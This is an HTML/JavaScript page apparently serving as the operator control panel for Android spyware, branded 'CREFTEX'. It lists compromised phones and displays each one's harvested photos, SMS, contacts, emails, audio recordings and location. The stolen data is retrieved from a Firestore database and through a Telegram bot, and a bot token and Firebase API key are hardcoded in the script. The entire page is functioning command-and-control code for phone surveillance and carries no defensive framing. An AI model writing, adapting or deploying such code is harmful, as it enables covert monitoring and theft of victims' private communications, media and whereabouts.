<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#0a0f1a">
    <title>CREFTEX — Control Center</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0f1a;
            --card: #131e2f;
            --card-2: #1a2840;
            --border: #22344d;
            --text: #e8eef8;
            --dim: #7c8db0;
            --accent: #3b82f6;
            --cyan: #22d3ee;
            --green: #10b981;
            --purple: #8b5cf6;
            --red: #ef4444;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        html, body {
            overflow-x: hidden;
            width: 100%;
            max-width: 100vw;
        }
        body {
            background: linear-gradient(180deg, #0a0f1a, #050810);
            color: var(--text);
            min-height: 100vh;
            padding: 12px;
            padding-bottom: 30px;
            font-size: 14px;
        }
        .app {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 14px 16px;
            background: rgba(19, 30, 47, 0.8);
            border: 1px solid var(--border);
            border-radius: 16px;
            margin-bottom: 14px;
        }
        .brand { display: flex; align-items: center; gap: 10px; }
        .brand-logo {
            width: 42px; height: 42px;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--accent), var(--cyan));
            display: flex; align-items: center; justify-content: center;
            font-size: 20px;
            flex-shrink: 0;
        }
        .brand h1 {
            font-size: 17px; font-weight: 800;
            background: linear-gradient(135deg, #60a5fa, #22d3ee);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            line-height: 1.2;
        }
        .brand p { font-size: 10px; color: var(--dim); }
        .refresh-btn {
            padding: 8px 14px;
            background: rgba(59, 130, 246, 0.15);
            border: 1px solid rgba(59, 130, 246, 0.4);
            color: var(--accent);
            border-radius: 10px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
            flex-shrink: 0;
        }
        .refresh-btn:active { transform: scale(0.95); }

        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 14px;
        }
        .stat {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 12px 6px;
            text-align: center;
        }
        .stat .icon {
            font-size: 20px;
            margin-bottom: 4px;
        }
        .stat .num {
            font-size: 20px; font-weight: 800;
            color: var(--cyan);
            line-height: 1;
        }
        .stat .lbl {
            font-size: 10px;
            color: var(--dim);
            margin-top: 4px;
        }

        /* Section title */
        .section-title {
            display: flex; align-items: center; gap: 8px;
            font-size: 15px; font-weight: 700;
            margin: 16px 0 10px;
            padding: 0 4px;
        }
        .section-title .count {
            background: var(--accent);
            color: #fff;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 11px;
        }

        /* Devices List */
        .devices {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 16px;
        }
        .device {
            background: linear-gradient(160deg, #142231 0%, #131e30 60%, #1b1830 100%);
            border: 2px solid transparent;
            background-clip: padding-box;
            border-radius: 18px;
            padding: 14px;
            cursor: pointer;
            position: relative;
            transition: all 0.15s;
        }
        .device::before {
            content: ""; position: absolute; inset: -2px;
            border-radius: 20px; z-index: -1;
            background: linear-gradient(120deg, #00afff, #2e7fe8 40%, #8b3dff 75%, #b33cff);
        }
        .device.inactive::before {
            background: linear-gradient(120deg, #5a2020, #8b2d2d 40%, #b33c3c 75%, #d84c4c);
        }
        .device:active { transform: scale(0.98); }
        .device .status {
            position: absolute; top: 12px; left: 12px;
            width: 9px; height: 9px;
            border-radius: 50%;
            background: var(--green);
            box-shadow: 0 0 10px rgba(16, 185, 129, 0.9);
        }
        .device.inactive .status {
            background: var(--red);
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.9);
        }
        .device .name {
            font-size: 15px; font-weight: 800;
            margin-bottom: 6px;
            direction: ltr;
            text-align: left;
            padding-left: 16px;
            word-break: break-word;
        }
        .device .meta {
            font-size: 11px; color: var(--dim);
            direction: ltr;
            text-align: left;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            padding-left: 16px;
        }

        /* Detail Panel */
        .detail {
            display: none;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 14px;
            margin-bottom: 14px;
        }
        .detail.open { display: block; }
        .detail-head {
            display: flex; justify-content: space-between; align-items: center;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 14px;
            gap: 10px;
        }
        .detail-title {
            display: flex; align-items: center; gap: 10px;
            min-width: 0;
            flex: 1;
        }
        .detail-title .avatar {
            width: 44px; height: 44px;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--accent), var(--cyan));
            display: flex; align-items: center; justify-content: center;
            font-size: 22px;
            flex-shrink: 0;
        }
        .detail-title h2 {
            font-size: 15px;
            word-break: break-word;
        }
        .detail-title p {
            font-size: 10px; color: var(--dim);
            direction: ltr;
            word-break: break-all;
        }
        .close-btn {
            padding: 6px 12px;
            background: rgba(239, 68, 68, 0.15);
            border: 1px solid rgba(239, 68, 68, 0.4);
            color: var(--red);
            border-radius: 8px;
            font-size: 11px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
            flex-shrink: 0;
        }

        /* Tabs */
        .tabs {
            display: flex; gap: 6px;
            margin-bottom: 14px;
            overflow-x: auto;
            scrollbar-width: none;
            padding-bottom: 4px;
            -webkit-overflow-scrolling: touch;
        }
        .tabs::-webkit-scrollbar { display: none; }
        .tab {
            padding: 8px 14px;
            background: var(--card-2);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: var(--dim);
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
            white-space: nowrap;
            flex-shrink: 0;
        }
        .tab.on {
            background: linear-gradient(135deg, var(--accent), #2563eb);
            color: #fff;
            border-color: var(--accent);
        }

        /* Tab Content */
        .tab-content { display: none; }
        .tab-content.on { display: block; }

        /* Gallery */
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 6px;
        }
        .gallery img {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 10px;
            cursor: pointer;
            border: 1px solid var(--border);
            background: var(--card-2);
            transition: transform 0.15s;
        }
        .gallery img:active { transform: scale(0.96); }

        /* List */
        .list {
            display: flex;
            flex-direction: column;
            gap: 8px;
            max-height: 500px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }
        .list-item {
            background: var(--card-2);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 12px;
            font-size: 13px;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }
        .list-item .title {
            font-weight: 700;
            color: var(--cyan);
            margin-bottom: 6px;
            font-size: 13px;
        }
        .list-item .text {
            color: var(--text);
            line-height: 1.6;
            font-size: 12px;
            word-break: break-word;
            white-space: pre-wrap;
        }
        .list-item .meta {
            font-size: 10px;
            color: var(--dim);
            margin-top: 6px;
            direction: ltr;
        }
        .list-item audio {
            width: 100%;
            margin-top: 8px;
            height: 36px;
        }

        .empty {
            text-align: center;
            padding: 40px 20px;
            color: var(--dim);
        }
        .empty .icon { font-size: 44px; margin-bottom: 10px; opacity: 0.4; }
        .empty div:last-child { font-size: 13px; }

        /* Modal */
        .modal {
            position: fixed; inset: 0;
            background: rgba(0, 0, 0, 0.95);
            display: none;
            align-items: center; justify-content: center;
            z-index: 9999;
            padding: 16px;
        }
        .modal.show { display: flex; }
        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
        .modal-close {
            position: absolute; top: 16px; right: 16px;
            width: 40px; height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: #fff;
            font-size: 22px;
            cursor: pointer;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 20px; left: 50%;
            transform: translateX(-50%) translateY(100px);
            padding: 12px 20px;
            border-radius: 12px;
            background: rgba(19, 30, 47, 0.95);
            border: 1px solid var(--border);
            font-size: 13px;
            font-weight: 700;
            transition: transform 0.3s;
            z-index: 9999;
            max-width: 90vw;
            text-align: center;
        }
        .toast.show { transform: translateX(-50%) translateY(0); }
        .toast.ok { border-color: var(--green); color: var(--green); }
        .toast.err { border-color: var(--red); color: var(--red); }

        /* Fix iOS zoom */
        input, textarea, select, button { font-size: 16px; }
    </style>
</head>
<body>
<div class="app">
    <!-- Header -->
    <div class="header">
        <div class="brand">
            <div class="brand-logo">⚡</div>
            <div>
                <h1>CREFTEX</h1>
                <p>CONTROL CENTER</p>
            </div>
        </div>
        <button class="refresh-btn" onclick="loadAll()">🔄</button>
    </div>

    <!-- Stats -->
    <div class="stats">
        <div class="stat">
            <div class="icon">📱</div>
            <div class="num" id="statDevices">0</div>
            <div class="lbl">الأجهزة</div>
        </div>
        <div class="stat">
            <div class="icon">📸</div>
            <div class="num" id="statPhotos" style="color: var(--cyan);">0</div>
            <div class="lbl">الصور</div>
        </div>
        <div class="stat">
            <div class="icon">💬</div>
            <div class="num" id="statMessages" style="color: var(--purple);">0</div>
            <div class="lbl">الرسائل</div>
        </div>
    </div>

    <!-- Devices -->
    <div class="section-title">
        <span>📱 الأجهزة</span>
        <span class="count" id="deviceCount">0</span>
    </div>
    <div class="devices" id="devicesList">
        <div class="empty">
            <div class="icon">📭</div>
            <div>لا أجهزة مسجّلة بعد</div>
        </div>
    </div>

    <!-- Detail -->
    <div class="detail" id="detail">
        <div class="detail-head">
            <div class="detail-title">
                <div class="avatar">📱</div>
                <div style="min-width:0;">
                    <h2 id="detailName">—</h2>
                    <p id="detailId">—</p>
                </div>
            </div>
            <button class="close-btn" onclick="closeDetail()">✕</button>
        </div>

        <div class="tabs">
            <button class="tab on" onclick="switchTab(this, 'photos')">📸 صور</button>
            <button class="tab" onclick="switchTab(this, 'sms')">📩 SMS</button>
            <button class="tab" onclick="switchTab(this, 'contacts')">👥 جهات</button>
            <button class="tab" onclick="switchTab(this, 'emails')">📧 إيميل</button>
            <button class="tab" onclick="switchTab(this, 'music')">🎵 صوت</button>
            <button class="tab" onclick="switchTab(this, 'location')">📍 موقع</button>
        </div>

        <div class="tab-content on" id="tab-photos">
            <div class="gallery" id="photosGrid"></div>
        </div>
        <div class="tab-content" id="tab-sms">
            <div class="list" id="smsList"></div>
        </div>
        <div class="tab-content" id="tab-contacts">
            <div class="list" id="contactsList"></div>
        </div>
        <div class="tab-content" id="tab-emails">
            <div class="list" id="emailsList"></div>
        </div>
        <div class="tab-content" id="tab-music">
            <div class="list" id="musicList"></div>
        </div>
        <div class="tab-content" id="tab-location">
            <div class="list" id="locationList"></div>
        </div>
    </div>
</div>

<div class="modal" id="imgModal" onclick="closeModal()">
    <button class="modal-close">×</button>
    <img id="modalImg" src="" alt="">
</div>

<div class="toast" id="toast"></div>

<script>
const TELEGRAM_BOT_TOKEN = "8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";

const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
const FS_DEVICES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`;
const FS_MESSAGES = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;

let currentDevice = null;
let allMessages = [];
let deviceNames = JSON.parse(localStorage.getItem('device_names') || '{}');

function toast(msg, type='ok') {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast show ' + type;
    clearTimeout(window.__tt);
    window.__tt = setTimeout(() => t.classList.remove('show'), 2200);
}

async function loadDevices() {
    try {
        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
        const data = await res.json();
        const docs = data.documents || [];
        const list = document.getElementById('devicesList');

        if (docs.length === 0) {
            list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا أجهزة مسجّلة بعد</div></div>`;
            document.getElementById('statDevices').textContent = '0';
            document.getElementById('deviceCount').textContent = '0';
            return;
        }

        const devices = docs.map(d => {
            const f = d.fields || {};
            const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
            return {
                id: f.id?.stringValue || '',
                brand: f.brand?.stringValue || '',
                manufacturer: f.manufacturer?.stringValue || '',
                model: f.model?.stringValue || '',
                android: f.android?.stringValue || '',
                lastSeen: lastSeen,
                isActive: (Date.now() - lastSeen) < 10 * 60 * 1000
            };
        }).sort((a, b) => b.lastSeen - a.lastSeen);

        document.getElementById('statDevices').textContent = devices.length;
        document.getElementById('deviceCount').textContent = devices.length;

        list.innerHTML = '';
        for (const d of devices) list.appendChild(buildDeviceCard(d));
    } catch (e) { console.error(e); }
}

function buildDeviceCard(d) {
    const card = document.createElement('div');
    card.className = 'device' + (d.isActive ? '' : ' inactive');
    card.onclick = () => openDevice(d);

    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
    card.innerHTML = `
        <div class="status"></div>
        <div class="name">${escapeHtml(customName)}</div>
        <div class="meta">Android ${escapeHtml(d.android)}</div>
        <div class="meta">${escapeHtml(d.id)}</div>
    `;
    return card;
}

async function openDevice(d) {
    currentDevice = d;
    const customName = deviceNames[d.id] || `${d.manufacturer} ${d.model}`;
    document.getElementById('detailName').textContent = customName;
    document.getElementById('detailId').textContent = d.id;
    document.getElementById('detail').classList.add('open');
    document.getElementById('detail').scrollIntoView({ behavior: 'smooth', block: 'start' });
    toast('⏳ جلب البيانات...');
    await loadMessages();
    renderPhotos();
    toast('✅ تم التحميل');
}

function closeDetail() {
    document.getElementById('detail').classList.remove('open');
    currentDevice = null;
}

function switchTab(el, tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('on'));
    el.classList.add('on');
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('on'));
    document.getElementById('tab-' + tabName).classList.add('on');
    if (tabName === 'photos') renderPhotos();
    else if (tabName === 'sms') renderSms();
    else if (tabName === 'contacts') renderContacts();
    else if (tabName === 'emails') renderEmails();
    else if (tabName === 'music') renderMusic();
    else if (tabName === 'location') renderLocation();
}

async function loadMessages() {
    try {
        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=1000`);
        const data = await res.json();
        allMessages = (data.documents || []).map(d => {
            const f = d.fields || {};
            return {
                type: f.type?.stringValue || 'text',
                text: f.text?.stringValue || '',
                file_id: f.file_id?.stringValue || '',
                caption: f.caption?.stringValue || '',
                time_ms: parseInt(f.time_ms?.integerValue || '0'),
                from_user: f.from_user?.booleanValue || false
            };
        }).sort((a, b) => a.time_ms - b.time_ms);

        document.getElementById('statMessages').textContent = allMessages.length;
        document.getElementById('statPhotos').textContent = allMessages.filter(m => m.type === 'photo').length;
    } catch (e) { console.error(e); }
}

function renderPhotos() {
    const grid = document.getElementById('photosGrid');
    const photos = allMessages.filter(m => m.type === 'photo' && m.file_id);

    if (photos.length === 0) {
        grid.innerHTML = `<div class="empty" style="grid-column: 1/-1;"><div class="icon">📭</div><div>لا توجد صور</div></div>`;
        return;
    }
    grid.innerHTML = '';
    for (const p of photos) {
        const img = document.createElement('img');
        img.dataset.file = p.file_id;
        img.alt = p.caption || 'photo';
        img.onclick = () => openModal(img.src);
        grid.appendChild(img);
        loadMedia(p.file_id, img);
    }
}

function renderSms() {
    const list = document.getElementById('smsList');
    const sms = allMessages.filter(m => m.type === 'sms' || (m.text && m.text.includes('📩 SMS')));

    if (sms.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد رسائل SMS</div></div>`;
        return;
    }
    list.innerHTML = '';
    for (const s of sms.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="title">📩 رسالة</div>
            <div class="text">${escapeHtml(s.text || s.caption)}</div>
            <div class="meta">${new Date(s.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

function renderContacts() {
    const list = document.getElementById('contactsList');
    const contacts = allMessages.filter(m => m.text && (m.text.includes('👥') || m.text.includes('👤')));
    if (contacts.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد جهات اتصال</div></div>`;
        return;
    }
    list.innerHTML = '';
    for (const c of contacts.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(c.text).replace(/\n/g, '<br>')}</div>
            <div class="meta">${new Date(c.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

function renderEmails() {
    const list = document.getElementById('emailsList');
    const emails = allMessages.filter(m => m.text && m.text.includes('📧'));
    if (emails.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد إيميلات</div></div>`;
        return;
    }
    list.innerHTML = '';
    for (const e of emails.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(e.text).replace(/\n/g, '<br>')}</div>
            <div class="meta">${new Date(e.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

function renderMusic() {
    const list = document.getElementById('musicList');
    const music = allMessages.filter(m => m.type === 'audio' && m.file_id);
    if (music.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا توجد موسيقى</div></div>`;
        return;
    }
    list.innerHTML = '';
    for (const m of music.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="title">🎵 مقطع صوتي</div>
            <audio controls data-file="${escapeAttr(m.file_id)}"></audio>
            <div class="meta">${new Date(m.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
        loadMedia(m.file_id, div.querySelector('audio'));
    }
}

function renderLocation() {
    const list = document.getElementById('locationList');
    const locations = allMessages.filter(m => m.text && m.text.includes('📍'));
    if (locations.length === 0) {
        list.innerHTML = `<div class="empty"><div class="icon">📭</div><div>لا يوجد موقع</div></div>`;
        return;
    }
    list.innerHTML = '';
    for (const l of locations.reverse()) {
        const div = document.createElement('div');
        div.className = 'list-item';
        div.innerHTML = `
            <div class="text">${escapeHtml(l.text).replace(/\n/g, '<br>')}</div>
            <div class="meta">${new Date(l.time_ms).toLocaleString('ar-EG')}</div>
        `;
        list.appendChild(div);
    }
}

async function loadMedia(fileId, el) {
    try {
        const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
        const data = await res.json();
        if (data.ok && data.result.file_path) {
            el.src = `${TG_FILE}/${data.result.file_path}`;
        }
    } catch (e) {}
}

function openModal(src) {
    document.getElementById('modalImg').src = src;
    document.getElementById('imgModal').classList.add('show');
}
function closeModal() {
    document.getElementById('imgModal').classList.remove('show');
}

function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function escapeAttr(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

async function loadAll() {
    toast('⏳ تحديث...');
    await loadDevices();
    if (currentDevice) {
        await loadMessages();
        renderPhotos();
    }
    toast('✅ تم');
}

loadDevices();
setInterval(loadDevices, 30000);
</script>
